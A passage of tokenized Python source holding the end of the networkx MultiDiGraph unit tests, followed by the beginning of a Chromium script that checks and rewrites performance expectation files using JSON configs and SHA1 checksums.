0 , { } ) , ( 1 , 2 , { } ) , ( 2 , 0 , { } ) , ( 2 , 1 , { } ) ] ) <newline> assert_equal ( sorted ( G . edges ( 0 , data = True ) ) , [ ( 0 , 1 , { } ) , ( 0 , 2 , { } ) ] ) <newline> assert_raises ( ( KeyError , networkx . NetworkXError ) , G . neighbors , - 1 ) <newline> <dedent> def test_edges_iter ( self ) : <newline> <indent> G = self . K3 <newline> assert_equal ( sorted ( G . edges_iter ( ) ) , [ ( 0 , 1 ) , ( 0 , 2 ) , ( 1 , 0 ) , ( 1 , 2 ) , ( 2 , 0 ) , ( 2 , 1 ) ] ) <newline> assert_equal ( sorted ( G . edges_iter ( 0 ) ) , [ ( 0 , 1 ) , ( 0 , 2 ) ] ) <newline> G . add_edge ( 0 , 1 ) <newline> assert_equal ( sorted ( G . edges_iter ( ) ) , [ ( 0 , 1 ) , ( 0 , 1 ) , ( 0 , 2 ) , ( 1 , 0 ) , ( 1 , 2 ) , ( 2 , 0 ) , ( 2 , 1 ) ] ) <newline> <dedent> def test_out_edges ( self ) : <newline> <indent> G = self . K3 <newline> assert_equal ( sorted ( G . out_edges ( ) ) , [ ( 0 , 1 ) , ( 0 , 2 ) , ( 1 , 0 ) , ( 1 , 2 ) , ( 2 , 0 ) , ( 2 , 1 ) ] ) <newline> assert_equal ( sorted ( G . out_edges ( 0 ) ) , [ ( 0 , 1 ) , ( 0 , 2 ) ] ) <newline> assert_raises ( ( KeyError , networkx . NetworkXError ) , G . out_edges , - 1 ) <newline> assert_equal ( sorted ( G . out_edges ( 0 , keys = True ) ) , [ ( 0 , 1 , 0 ) , ( 0 , 2 , 0 ) ] ) <newline> <dedent> def test_out_edges_iter ( self ) : <newline> <indent> G = self . K3 <newline> assert_equal ( sorted ( G . out_edges_iter ( ) ) , [ ( 0 , 1 ) , ( 0 , 2 ) , ( 1 , 0 ) , ( 1 , 2 ) , ( 2 , 0 ) , ( 2 , 1 ) ] ) <newline> assert_equal ( sorted ( G . out_edges_iter ( 0 ) ) , [ ( 0 , 1 ) , ( 0 , 2 ) ] ) <newline> G . add_edge ( 0 , 1 , 2 ) <newline> assert_equal ( sorted ( G . out_edges_iter ( ) ) , [ ( 0 , 1 ) , ( 0 , 1 ) , ( 0 , 2 ) , ( 1 , 0 ) , ( 1 , 2 ) , ( 2 , 0 ) , ( 2 , 1 ) ] ) <newline> <dedent> def test_in_edges ( self ) : <newline> <indent> G = self . K3 <newline> assert_equal ( sorted ( G . in_edges ( ) ) , [ ( 0 , 1 ) , ( 0 , 2 ) , ( 1 , 0 ) , ( 1 , 2 ) , ( 2 , 0 ) , ( 2 , 1 ) ] ) <newline> assert_equal ( sorted ( G . in_edges ( 0 ) ) , [ ( 1 , 0 ) , ( 2 , 0 ) ] ) <newline> assert_raises ( ( KeyError , networkx . NetworkXError ) , G . in_edges , - 1 ) <newline> G . add_edge ( 0 , 1 , 2 ) <newline> assert_equal ( sorted ( G . in_edges ( ) ) , [ ( 0 , 1 ) , ( 0 , 1 ) , ( 0 , 2 ) , ( 1 , 0 ) , ( 1 , 2 ) , ( 2 , 0 ) , ( 2 , 1 ) ] ) <newline> assert_equal ( sorted ( G . in_edges ( 0 , keys = True ) ) , [ ( 1 , 0 , 0 ) , ( 2 , 0 , 0 ) ] ) <newline> <dedent> def test_in_edges_iter ( self ) : <newline> <indent> G = self . K3 <newline> assert_equal ( sorted ( G . in_edges_iter ( ) ) , [ ( 0 , 1 ) , ( 0 , 2 ) , ( 1 , 0 ) , ( 1 , 2 ) , ( 2 , 0 ) , ( 2 , 1 ) ] ) <newline> assert_equal ( sorted ( G . in_edges_iter ( 0 ) ) , [ ( 1 , 0 ) , ( 2 , 0 ) ] ) <newline> G . add_edge ( 0 , 1 , 2 ) <newline> assert_equal ( sorted ( G . in_edges_iter ( ) ) , [ ( 0 , 1 ) , ( 0 , 1 ) , ( 0 , 2 ) , ( 1 , 0 ) , ( 1 , 2 ) , ( 2 , 0 ) , ( 2 , 1 ) ] ) <newline> assert_equal ( sorted ( G . in_edges_iter ( data = True , keys = False ) ) , [ ( 0 , 1 , { } ) , ( 0 , 1 , { } ) , ( 0 , 2 , { } ) , ( 1 , 0 , { } ) , ( 1 , 2 , { } ) , ( 2 , 0 , { } ) , ( 2 , 1 , { } ) ] ) <newline> <dedent> def is_shallow ( self , H , G ) : <newline>  # ▁ graph <encdom> <indent> assert_equal ( G . graph [ 'foo' ] , H . graph [ 'foo' ] ) <newline> G . graph [ 'foo' ] . append ( 1 ) <newline> assert_equal ( G . graph [ 'foo' ] , H . graph [ 'foo' ] ) <newline>  # ▁ node <encdom> assert_equal ( G . node [ 0 ] [ 'foo' ] , H . node [ 0 ] [ 'foo' ] ) <newline> G . node [ 0 ] [ 'foo' ] . append ( 1 ) <newline> assert_equal ( G . node [ 0 ] [ 'foo' ] , H . node [ 0 ] [ 'foo' ] ) <newline>  # ▁ edge <encdom> assert_equal ( G [ 1 ] [ 2 ] [ 0 ] [ 'foo' ] , H [ 1 ] [ 2 ] [ 0 ] [ 'foo' ] ) <newline> G [ 1 ] [ 2 ] [ 0 ] [ 'foo' ] . append ( 1 ) <newline> assert_equal ( G [ 1 ] [ 2 ] [ 0 ] [ 'foo' ] , H [ 1 ] [ 2 ] [ 0 ] [ 'foo' ] ) <newline> <dedent> def is_deep ( self , H , G ) : <newline>  # ▁ graph <encdom> <indent> assert_equal ( G . graph [ 'foo' ] , H . graph [ 'foo' ] ) <newline> G . graph [ 'foo' ] . append ( 1 ) <newline> assert_not_equal ( G . graph [ 'foo' ] , H . graph [ 'foo' ] ) <newline>  # ▁ node <encdom> assert_equal ( G . node [ 0 ] [ 'foo' ] , H . node [ 0 ] [ 'foo' ] ) <newline> G . node [ 0 ] [ 'foo' ] . append ( 1 ) <newline> assert_not_equal ( G . node [ 0 ] [ 'foo' ] , H . node [ 0 ] [ 'foo' ] ) <newline>  # ▁ edge <encdom> assert_equal ( G [ 1 ] [ 2 ] [ 0 ] [ 'foo' ] , H [ 1 ] [ 2 ] [ 0 ] [ 'foo' ] ) <newline> G [ 1 ] [ 2 ] [ 0 ] [ 'foo' ] . append ( 1 ) <newline> assert_not_equal ( G [ 1 ] [ 2 ] [ 0 ] [ 'foo' ] , H [ 1 ] [ 2 ] [ 0 ] [ 'foo' ] ) <newline> <dedent> def test_to_undirected ( self ) : <newline>  # ▁ MultiDiGraph ▁ -> ▁ MultiGraph ▁ changes ▁ number ▁ of ▁ edges ▁ so ▁ it ▁ is <encdom>  # ▁ not ▁ a ▁ copy ▁ operation... ▁ use ▁ is_shallow, ▁ not ▁ is_shallow_copy <encdom> <indent> G = self . K3 <newline> self . add_attributes ( G ) <newline> H = networkx . MultiGraph ( G ) <newline> self . is_shallow ( H , G ) <newline> H = G . to_undirected ( ) <newline> self . is_deep ( H , G ) <newline> <dedent> def test_has_successor ( self ) : <newline> <indent> G = self . K3 <newline> assert_equal ( G . has_successor ( 0 , 1 ) , True ) <newline> assert_equal ( G . has_successor ( 0 , - 1 ) , False ) <newline> <dedent> def test_successors ( self ) : <newline> <indent> G = self . K3 <newline> assert_equal ( sorted ( G . successors ( 0 ) ) , [ 1 , 2 ] ) <newline> assert_raises ( ( KeyError , networkx . NetworkXError ) , G . successors , - 1 ) <newline> <dedent> def test_successors_iter ( self ) : <newline> <indent> G = self . K3 <newline> assert_equal ( sorted ( G . successors_iter ( 0 ) ) , [ 1 , 2 ] ) <newline> assert_raises ( ( KeyError , networkx . NetworkXError ) , G . successors_iter , - 1 ) <newline> <dedent> def test_has_predecessor ( self ) : <newline> <indent> G = self . K3 <newline> assert_equal ( G . has_predecessor ( 0 , 1 ) , True ) <newline> assert_equal ( G . has_predecessor ( 0 , - 1 ) , False ) <newline> <dedent> def test_predecessors ( self ) : <newline> <indent> G = self . K3 <newline> assert_equal ( sorted ( G . predecessors ( 0 ) ) , [ 1 , 2 ] ) <newline> assert_raises ( ( KeyError , networkx . NetworkXError ) , G . predecessors , - 1 ) <newline> <dedent> def test_predecessors_iter ( self ) : <newline> <indent> G = self . K3 <newline> assert_equal ( sorted ( G . predecessors_iter ( 0 ) ) , [ 1 , 2 ] ) <newline> assert_raises ( ( KeyError , networkx . NetworkXError ) , G . predecessors_iter , - 1 ) <newline> <dedent> def test_degree ( self ) : <newline> <indent> G = self . K3 <newline> assert_equal ( list ( G . degree ( ) . values ( ) ) , [ 4 , 4 , 4 ] ) <newline> assert_equal ( G . degree ( ) , { 0 : 4 , 1 : 4 , 2 : 4 } ) <newline> assert_equal ( G . degree ( 0 ) , 4 ) <newline> assert_equal ( G . degree ( [ 0 ] ) , { 0 : 4 } ) <newline> assert_equal ( G . degree ( iter ( [ 0 ] ) ) , { 0 : 4 } ) <newline> assert_raises ( ( KeyError , networkx . NetworkXError ) , G . degree , - 1 ) <newline> <dedent> def test_degree_iter ( self ) : <newline> <indent> G = self . K3 <newline> assert_equal ( list ( G . degree_iter ( ) ) , [ ( 0 , 4 ) , ( 1 , 4 ) , ( 2 , 4 ) ] ) <newline> assert_equal ( dict ( G . degree_iter ( ) ) , { 0 : 4 , 1 : 4 , 2 : 4 } ) <newline> assert_equal ( list ( G . degree_iter ( 0 ) ) , [ ( 0 , 4 ) ] ) <newline> assert_equal ( list ( G . degree_iter ( iter ( [ 0 ] ) ) ) , [ ( 0 , 4 ) ] ) <newline> G . add_edge ( 0 , 1 , weight = 0.3 , other = 1.2 ) <newline> assert_equal ( list ( G . degree_iter ( weight = 'weight' ) ) , [ ( 0 , 4.3 ) , ( 1 , 4.3 ) , ( 2 , 4 ) ] ) <newline> assert_equal ( list ( G . degree_iter ( weight = 'other' ) ) , [ ( 0 , 5.2 ) , ( 1 , 5.2 ) , ( 2 , 4 ) ] ) <newline> <dedent> def test_in_degree ( self ) : <newline> <indent> G = self . K3 <newline> assert_equal ( list ( G . in_degree ( ) . values ( ) ) , [ 2 , 2 , 2 ] ) <newline> assert_equal ( G . in_degree ( ) , { 0 : 2 , 1 : 2 , 2 : 2 } ) <newline> assert_equal ( G . in_degree ( 0 ) , 2 ) <newline> assert_equal ( G . in_degree ( [ 0 ] ) , { 0 : 2 } ) <newline> assert_equal ( G . in_degree ( iter ( [ 0 ] ) ) , { 0 : 2 } ) <newline> assert_raises ( ( KeyError , networkx . NetworkXError ) , G . in_degree , - 1 ) <newline> <dedent> def test_in_degree_iter ( self ) : <newline> <indent> G = self . K3 <newline> assert_equal ( list ( G . in_degree_iter ( ) ) , [ ( 0 , 2 ) , ( 1 , 2 ) , ( 2 , 2 ) ] ) <newline> assert_equal ( dict ( G . in_degree_iter ( ) ) , { 0 : 2 , 1 : 2 , 2 : 2 } ) <newline> assert_equal ( list ( G . in_degree_iter ( 0 ) ) , [ ( 0 , 2 ) ] ) <newline> assert_equal ( list ( G . in_degree_iter ( iter ( [ 0 ] ) ) ) , [ ( 0 , 2 ) ] ) <newline> assert_equal ( list ( G . in_degree_iter ( 0 , weight = 'weight' ) ) , [ ( 0 , 2 ) ] ) <newline> <dedent> def test_out_degree ( self ) : <newline> <indent> G = self . K3 <newline> assert_equal ( list ( G . out_degree ( ) . values ( ) ) , [ 2 , 2 , 2 ] ) <newline> assert_equal ( G . out_degree ( ) , { 0 : 2 , 1 : 2 , 2 : 2 } ) <newline> assert_equal ( G . out_degree ( 0 ) , 2 ) <newline> assert_equal ( G . out_degree ( [ 0 ] ) , { 0 : 2 } ) <newline> assert_equal ( G . out_degree ( iter ( [ 0 ] ) ) , { 0 : 2 } ) <newline> assert_raises ( ( KeyError , networkx . NetworkXError ) , G . out_degree , - 1 ) <newline> <dedent> def test_out_degree_iter ( self ) : <newline> <indent> G = self . K3 <newline> assert_equal ( list ( G . out_degree_iter ( ) ) , [ ( 0 , 2 ) , ( 1 , 2 ) , ( 2 , 2 ) ] ) <newline> assert_equal ( dict ( G . out_degree_iter ( ) ) , { 0 : 2 , 1 : 2 , 2 : 2 } ) <newline> assert_equal ( list ( G . out_degree_iter ( 0 ) ) , [ ( 0 , 2 ) ] ) <newline> assert_equal ( list ( G . out_degree_iter ( iter ( [ 0 ] ) ) ) , [ ( 0 , 2 ) ] ) <newline> assert_equal ( list ( G . out_degree_iter ( 0 , weight = 'weight' ) ) , [ ( 0 , 2 ) ] ) <newline> <dedent> def test_size ( self ) : <newline> <indent> G = self . K3 <newline> assert_equal ( G . size ( ) , 6 ) <newline> assert_equal ( G . number_of_edges ( ) , 6 ) <newline> G . add_edge ( 0 , 1 , weight = 0.3 , other = 1.2 ) <newline> assert_equal ( G . size ( weight = 'weight' ) , 6.3 ) <newline> assert_equal ( G . size ( weight = 'other' ) , 7.2 ) <newline> <dedent> def test_to_undirected_reciprocal ( self ) : <newline> <indent> G = self . Graph ( ) <newline> G . add_edge ( 1 , 2 ) <newline> assert_true ( G . to_undirected ( ) . has_edge ( 1 , 2 ) ) <newline> assert_false ( G . to_undirected ( reciprocal = True ) . has_edge ( 1 , 2 ) ) <newline> G . add_edge ( 2 , 1 ) <newline> assert_true ( G . to_undirected ( reciprocal = True ) . has_edge ( 1 , 2 ) ) <newline> <dedent> def test_reverse_copy ( self ) : <newline> <indent> G = networkx . MultiDiGraph ( [ ( 0 , 1 ) , ( 0 , 1 ) ] ) <newline> R = G . reverse ( ) <newline> assert_equal ( sorted ( R . edges ( ) ) , [ ( 1 , 0 ) , ( 1 , 0 ) ] ) <newline> R . remove_edge ( 1 , 0 ) <newline> assert_equal ( sorted ( R . edges ( ) ) , [ ( 1 , 0 ) ] ) <newline> assert_equal ( sorted ( G . edges ( ) ) , [ ( 0 , 1 ) , ( 0 , 1 ) ] ) <newline> <dedent> def test_reverse_nocopy ( self ) : <newline> <indent> G = networkx . MultiDiGraph ( [ ( 0 , 1 ) , ( 0 , 1 ) ] ) <newline> R = G . reverse ( copy = False ) <newline> assert_equal ( sorted ( R . edges ( ) ) , [ ( 1 , 0 ) , ( 1 , 0 ) ] ) <newline> R . remove_edge ( 1 , 0 ) <newline> assert_equal ( sorted ( R . edges ( ) ) , [ ( 1 , 0 ) ] ) <newline> assert_equal ( sorted ( G . edges ( ) ) , [ ( 1 , 0 ) ] ) <newline> <dedent> <dedent> class TestMultiDiGraph ( BaseMultiDiGraphTester , TestMultiGraph ) : <newline> <indent> def setUp ( self ) : <newline> <indent> self . Graph = networkx . MultiDiGraph <newline>  # ▁ build ▁ K3 <encdom> self . k3edges = [ ( 0 , 1 ) , ( 0 , 2 ) , ( 1 , 2 ) ] <newline> self . k3nodes = [ 0 , 1 , 2 ] <newline> self . K3 = self . Graph ( ) <newline> self . K3 . adj = { 0 : { } , 1 : { } , 2 : { } } <newline> self . K3 . succ = self . K3 . adj <newline> self . K3 . pred = { 0 : { } , 1 : { } , 2 : { } } <newline> for u in self . k3nodes : <newline> <indent> for v in self . k3nodes : <newline> <indent> if u == v : continue <newline> d = { 0 : { } } <newline> self . K3 . succ [ u ] [ v ] = d <newline> self . K3 . pred [ v ] [ u ] = d <newline> <dedent> <dedent> self . K3 . adj = self . K3 . succ <newline> self . K3 . edge = self . K3 . adj <newline> self . K3 . node = { } <newline> self . K3 . node [ 0 ] = { } <newline> self . K3 . node [ 1 ] = { } <newline> self . K3 . node [ 2 ] = { } <newline> <dedent> def test_add_edge ( self ) : <newline> <indent> G = self . Graph ( ) <newline> G . add_edge ( 0 , 1 ) <newline> assert_equal ( G . adj , { 0 : { 1 : { 0 : { } } } , 1 : { } } ) <newline> assert_equal ( G . succ , { 0 : { 1 : { 0 : { } } } , 1 : { } } ) <newline> assert_equal ( G . pred , { 0 : { } , 1 : { 0 : { 0 : { } } } } ) <newline> G = self . Graph ( ) <newline> G . add_edge ( * ( 0 , 1 ) ) <newline> assert_equal ( G . adj , { 0 : { 1 : { 0 : { } } } , 1 : { } } ) <newline> assert_equal ( G . succ , { 0 : { 1 : { 0 : { } } } , 1 : { } } ) <newline> assert_equal ( G . pred , { 0 : { } , 1 : { 0 : { 0 : { } } } } ) <newline> <dedent> def test_add_edges_from ( self ) : <newline> <indent> G = self . Graph ( ) <newline> G . add_edges_from ( [ ( 0 , 1 ) , ( 0 , 1 , { 'weight' : 3 } ) ] ) <newline> assert_equal ( G . adj , { 0 : { 1 : { 0 : { } , 1 : { 'weight' : 3 } } } , 1 : { } } ) <newline> assert_equal ( G . succ , { 0 : { 1 : { 0 : { } , 1 : { 'weight' : 3 } } } , 1 : { } } ) <newline> assert_equal ( G . pred , { 0 : { } , 1 : { 0 : { 0 : { } , 1 : { 'weight' : 3 } } } } ) <newline> G . add_edges_from ( [ ( 0 , 1 ) , ( 0 , 1 , { 'weight' : 3 } ) ] , weight = 2 ) <newline> assert_equal ( G . succ , { 0 : { 1 : { 0 : { } , 1 : { 'weight' : 3 } , 2 : { 'weight' : 2 } , 3 : { 'weight' : 3 } } } , 1 : { } } ) <newline> assert_equal ( G . pred , { 0 : { } , 1 : { 0 : { 0 : { } , 1 : { 'weight' : 3 } , 2 : { 'weight' : 2 } , 3 : { 'weight' : 3 } } } } ) <newline> assert_raises ( networkx . NetworkXError , G . add_edges_from , [ ( 0 , ) ] )  # ▁ too ▁ few ▁ in ▁ tuple <encdom> <newline> assert_raises ( networkx . NetworkXError , G . add_edges_from , [ ( 0 , 1 , 2 , 3 , 4 ) ] )  # ▁ too ▁ many ▁ in ▁ tuple <encdom> <newline> assert_raises ( TypeError , G . add_edges_from , [ 0 ] )  # ▁ not ▁ a ▁ tuple <encdom> <newline> <dedent> def test_remove_edge ( self ) : <newline> <indent> G = self . K3 <newline> G . remove_edge ( 0 , 1 ) <newline> assert_equal ( G . succ , { 0 : { 2 : { 0 : { } } } , 1 : { 0 : { 0 : { } } , 2 : { 0 : { } } } , 2 : { 0 : { 0 : { } } , 1 : { 0 : { } } } } ) <newline> assert_equal ( G . pred , { 0 : { 1 : { 0 : { } } , 2 : { 0 : { } } } , 1 : { 2 : { 0 : { } } } , 2 : { 0 : { 0 : { } } , 1 : { 0 : { } } } } ) <newline> assert_raises ( ( KeyError , networkx . NetworkXError ) , G . remove_edge , - 1 , 0 ) <newline> assert_raises ( ( KeyError , networkx . NetworkXError ) , G . remove_edge , 0 , 2 , key = 1 ) <newline> <dedent> def test_remove_multiedge ( self ) : <newline> <indent> G = self . K3 <newline> G . add_edge ( 0 , 1 , key = 'parallel ▁ edge' ) <newline> G . remove_edge ( 0 , 1 , key = 'parallel ▁ edge' ) <newline> assert_equal ( G . adj , { 0 : { 1 : { 0 : { } } , 2 : { 0 : { } } } , 1 : { 0 : { 0 : { } } , 2 : { 0 : { } } } , 2 : { 0 : { 0 : { } } , 1 : { 0 : { } } } } ) <newline> assert_equal ( G . succ , { 0 : { 1 : { 0 : { } } , 2 : { 0 : { } } } , 1 : { 0 : { 0 : { } } , 2 : { 0 : { } } } , 2 : { 0 : { 0 : { } } , 1 : { 0 : { } } } } ) <newline> assert_equal ( G . pred , { 0 : { 1 : { 0 : { } } , 2 : { 0 : { } } } , 1 : { 0 : { 0 : { } } , 2 : { 0 : { } } } , 2 : { 0 : { 0 : { } } , 1 : { 0 : { } } } } ) <newline> G . remove_edge ( 0 , 1 ) <newline> assert_equal ( G . succ , { 0 : { 2 : { 0 : { } } } , 1 : { 0 : { 0 : { } } , 2 : { 0 : { } } } , 2 : { 0 : { 0 : { } } , 1 : { 0 : { } } } } ) <newline> assert_equal ( G . pred , { 0 : { 1 : { 0 : { } } , 2 : { 0 : { } } } , 1 : { 2 : { 0 : { } } } , 2 : { 0 : { 0 : { } } , 1 : { 0 : { } } } } ) <newline> assert_raises ( ( KeyError , networkx . NetworkXError ) , G . remove_edge , - 1 , 0 ) <newline> <dedent> def test_remove_edges_from ( self ) : <newline> <indent> G = self . K3 <newline> G . remove_edges_from ( [ ( 0 , 1 ) ] ) <newline> assert_equal ( G . succ , { 0 : { 2 : { 0 : { } } } , 1 : { 0 : { 0 : { } } , 2 : { 0 : { } } } , 2 : { 0 : { 0 : { } } , 1 : { 0 : { } } } } ) <newline> assert_equal ( G . pred , { 0 : { 1 : { 0 : { } } , 2 : { 0 : { } } } , 1 : { 2 : { 0 : { } } } , 2 : { 0 : { 0 : { } } , 1 : { 0 : { } } } } ) <newline> G . remove_edges_from ( [ ( 0 , 0 ) ] )  # ▁ silent ▁ fail <encdom> <newline> <dedent> <dedent>
 # !/usr/bin/env ▁ python <encdom>  # ▁ Copyright ▁ (c) ▁ 2012 ▁ The ▁ Chromium ▁ Authors. ▁ All ▁ rights ▁ reserved. <encdom>  # ▁ Use ▁ of ▁ this ▁ source ▁ code ▁ is ▁ governed ▁ by ▁ a ▁ BSD-style ▁ license ▁ that ▁ can ▁ be <encdom>  # ▁ found ▁ in ▁ the ▁ LICENSE ▁ file. <encdom>  # ▁ For ▁ instructions ▁ see: <encdom>  # ▁ http://www.chromium.org/developers/tree-sheriffs/perf-sheriffs <encdom> import hashlib <newline> import math <newline> import optparse <newline> import os <newline> import re <newline> import subprocess <newline> import sys <newline> import time <newline> import urllib2 <newline> try : <newline> <indent> import json <newline> <dedent> except ImportError : <newline> <indent> import simplejson as json <newline> <dedent> __version__ = '1.0' <newline> EXPECTATIONS_DIR = os . path . dirname ( os . path . abspath ( __file__ ) ) <newline> DEFAULT_CONFIG_FILE = os . path . join ( EXPECTATIONS_DIR , 'chromium_perf_expectations.cfg' ) <newline> DEFAULT_TOLERANCE = 0.05 <newline> USAGE = '' <newline> def ReadFile ( filename ) : <newline> <indent> try : <newline> <indent> file = open ( filename , 'rb' ) <newline> <dedent> except IOError , e : <newline> <indent> print >> sys . stderr , ( 'I/O ▁ Error ▁ reading ▁ file ▁ %s(%s): ▁ %s' % ( filename , e . errno , e . strerror ) ) <newline> raise e <newline> <dedent> contents = file . read ( ) <newline> file . close ( ) <newline> return contents <newline> <dedent> def ConvertJsonIntoDict ( string ) : <newline> <indent>  """ Read ▁ a ▁ JSON ▁ string ▁ and ▁ convert ▁ its ▁ contents ▁ into ▁ a ▁ Python ▁ datatype. """  <newline> if len ( string ) == 0 : <newline> <indent> print >> sys . stderr , ( 'Error ▁ could ▁ not ▁ parse ▁ empty ▁ string' ) <newline> raise Exception ( 'JSON ▁ data ▁ missing' ) <newline> <dedent> try : <newline> <indent> jsondata = json . loads ( string ) <newline> <dedent> except ValueError , e : <newline> <indent> print >> sys . stderr , ( 'Error ▁ parsing ▁ string: ▁"%s"' % string ) <newline> raise e <newline> <dedent> return jsondata <newline>  # ▁ Floating ▁ point ▁ representation ▁ of ▁ last ▁ time ▁ we ▁ fetched ▁ a ▁ URL. <encdom> <dedent> last_fetched_at = None <newline> def FetchUrlContents ( url ) : <newline> <indent> global last_fetched_at <newline> if last_fetched_at and ( ( time . time ( ) - last_fetched_at ) <= 0.5 ) : <newline>  # ▁ Sleep ▁ for ▁ half ▁ a ▁ second ▁ to ▁ avoid ▁ overloading ▁ the ▁ server. <encdom> <indent> time . sleep ( 0.5 ) <newline> <dedent> try : <newline> <indent> last_fetched_at = time . time ( ) <newline> connection = urllib2 . urlopen ( url ) <newline> <dedent> except urllib2 . HTTPError , e : <newline> <indent> if e . code == 404 : <newline> <indent> return None <newline> <dedent> raise e <newline> <dedent> text = connection . read ( ) . strip ( ) <newline> connection . close ( ) <newline> return text <newline> <dedent> def GetRowData ( data , key ) : <newline> <indent> rowdata = [ ] <newline>  # ▁ reva ▁ and ▁ revb ▁ always ▁ come ▁ first. <encdom> for subkey in [ 'reva' , 'revb' ] : <newline> <indent> if subkey in data [ key ] : <newline> <indent> rowdata . append ( '"%s": ▁ %s' % ( subkey , data [ key ] [ subkey ] ) ) <newline>  # ▁ Strings, ▁ like ▁ type, ▁ come ▁ next. <encdom> <dedent> <dedent> for subkey in [ 'type' , 'better' ] : <newline> <indent> if subkey in data [ key ] : <newline> <indent> rowdata . append ( '"%s": ▁"%s"' % ( subkey , data [ key ] [ subkey ] ) ) <newline>  # ▁ Finally ▁ the ▁ main ▁ numbers ▁ come ▁ last. <encdom> <dedent> <dedent> for subkey in [ 'improve' , 'regress' , 'tolerance' ] : <newline> <indent> if subkey in data [ key ] : <newline> <indent> rowdata . append ( '"%s": ▁ %s' % ( subkey , data [ key ] [ subkey ] ) ) <newline> <dedent> <dedent> return rowdata <newline> <dedent> def GetRowDigest ( rowdata , key ) : <newline> <indent> sha1 = hashlib . sha1 ( ) <newline> rowdata = [ str ( possibly_unicode_string ) . encode ( 'ascii' ) for possibly_unicode_string in rowdata ] <newline> sha1 . update ( str ( rowdata ) + key ) <newline> return sha1 . hexdigest ( ) [ 0 : 8 ] <newline> <dedent> def WriteJson ( filename , data , keys , calculate_sha1 = True ) : <newline> <indent>  """ Write ▁ a ▁ list ▁ of ▁ |keys| ▁ in ▁ |data| ▁ to ▁ the ▁ file ▁ specified ▁ in ▁ |filename|. """  <newline> try : <newline> <indent> file = open ( filename , 'wb' ) <newline> <dedent> except IOError , e : <newline> <indent> print >> sys . stderr , ( 'I/O ▁ Error ▁ writing ▁ file ▁ %s(%s): ▁ %s' % ( filename , e . errno , e . strerror ) ) <newline> return False <newline> <dedent> jsondata = [ ] <newline> for key in keys : <newline> <indent> rowdata = GetRowData ( data , key ) <newline> if calculate_sha1 : <newline>  # ▁ Include ▁ an ▁ updated ▁ checksum. <encdom> <indent> rowdata . append ( '"sha1": ▁"%s"' % GetRowDigest ( rowdata , key ) ) <newline> <dedent> else : <newline> <indent> if 'sha1' in data [ key ] : <newline> <indent> rowdata . append ( '"sha1": ▁"%s"' % ( data [ key ] [ 'sha1' ] ) ) <newline> <dedent> <dedent> jsondata . append ( '"%s": ▁ {%s}' % ( key , ', ▁ ' . join ( rowdata ) ) ) <newline> <dedent> jsondata . append ( '"load": ▁ true' ) <newline> jsontext = '{%s \n }' % ', \n ▁ ' . join ( jsondata ) <newline> file . write ( jsontext + ' \n ' ) <newline> file . close ( ) <newline> return True <newline> <dedent> def FloatIsInt ( f ) : <newline> <indent> epsilon = 1.0e-10 <newline> return abs ( f - int ( f ) ) <= epsilon <newline> <dedent> last_key_printed = None <newline> def Main ( args ) : <newline> <indent> def OutputMessage ( message , verbose_message = True ) : <newline> <indent> global last_key_printed <newline> if not options . verbose and verbose_message : <newline> <indent> return <newline> <dedent> if key != last_key_printed : <newline> <indent> last_key_printed = key <newline> print ' \n ' + key + ':' <newline> <dedent> print ' ▁ ▁ %s' % message <newline> <dedent> parser = optparse . OptionParser ( usage = USAGE , version = __version__ ) <newline> parser . add_option ( '-v' , '--verbose' , action = 'store_true' , default = False , help = 'enable ▁ verbose ▁ output' ) <newline> parser . add_option ( '-s' , '--checksum' , action = 'store_true' , help = 'test ▁ if ▁ any ▁ changes ▁ are ▁ pending' ) <newline> parser . add_option ( '-c' , '--config' , dest = 'config_file' , default = DEFAULT_CONFIG_FILE , help = 'set ▁ the ▁ config ▁ file ▁ to ▁ FILE' , metavar = 'FILE' ) <newline> options , args = parser . parse_args ( args ) <newline> if options . verbose : <newline> <indent> print 'Verbose ▁ output ▁ enabled.' <newline> <dedent> config = ConvertJsonIntoDict ( ReadFile ( options . config_file ) ) <newline>  # ▁ Get ▁ the ▁ list ▁ of ▁ summaries ▁ for ▁ a ▁ test. <encdom> base_url = config [ 'base_url' ] <newline>  # ▁ Make ▁ the ▁ perf ▁ expectations ▁ file ▁ relative ▁ to ▁ the ▁ path ▁ of ▁ the ▁ config ▁ file. <encdom> perf_file = os . path . join ( os . path . dirname ( options . config_file ) , config [ 'perf_file' ] ) <newline> perf = ConvertJsonIntoDict ( ReadFile ( perf_file ) ) <newline>  # ▁ Fetch ▁ graphs.dat ▁ for ▁ this ▁ combination. <encdom> perfkeys = perf . keys ( ) <newline>  # ▁ In ▁ perf_expectations.json, ▁ ignore ▁ the ▁'load' ▁ key. <encdom> perfkeys . remove ( 'load' ) <newline> perfkeys . sort ( ) <newline> write_new_expectations = False <newline> found_checksum_mismatch = False <newline> for key in perfkeys : <newline> <indent> value = perf [ key ] <newline> tolerance = value . get ( 'tolerance' , DEFAULT_TOLERANCE ) <newline> better = value . get ( 'better' , None ) <newline>  # ▁ Verify ▁ the ▁ checksum. <encdom> original_checksum = value . get ( 'sha1' , '' ) <newline> if 'sha1' in value : <newline> <indent> del value [ 'sha1' ] <newline> <dedent> rowdata = GetRowData ( perf , key ) <newline> computed_checksum = GetRowDigest ( rowdata , key ) <newline> if original_checksum == computed_checksum : <newline> <indent> OutputMessage ( 'checksum ▁ matches, ▁ skipping' ) <newline> continue <newline> <dedent> elif options . checksum : <newline> <indent> found_checksum_mismatch = True <newline> continue <newline>  # ▁ Skip ▁ expectations ▁ that ▁ are ▁ missing ▁ a ▁ reva ▁ or ▁ revb. ▁ We ▁ can't ▁ generate <encdom>  # ▁ expectations ▁ for ▁ those. <encdom> <dedent> if not ( value . has_key ( 'reva' ) and value . has_key ( 'revb' ) ) : <newline> <indent> OutputMessage ( 'missing ▁ revision ▁ range, ▁ skipping' ) <newline> continue <newline> <dedent> revb = int ( value [ 'revb' ] ) <newline> reva = int ( value [ 'reva' ] ) <newline>  # ▁ Ensure ▁ that ▁ reva ▁ is ▁ less ▁ than ▁ revb. <encdom> if reva > revb : <newline> <indent> temp = reva <newline> reva = revb <newline> revb = temp <newline>  # ▁ Get ▁ the ▁ system/test/graph/tracename ▁ and ▁ reftracename ▁ for ▁ the ▁ current ▁ key. <encdom> <dedent> matchData = re . match ( r'^([^/]+)\/([^/]+)\/([^/]+)\/([^/]+)$' , key ) <newline> if not matchData : <newline> <indent> OutputMessage ( 'cannot ▁ parse ▁ key, ▁ skipping' ) <newline> continue <newline> <dedent> system = matchData . group ( 1 ) <newline> test = matchData . group ( 2 ) <newline> graph = matchData . group ( 3 ) <newline> tracename = matchData . group ( 4 ) <newline> reftracename = tracename + '_ref' <newline>  # ▁ 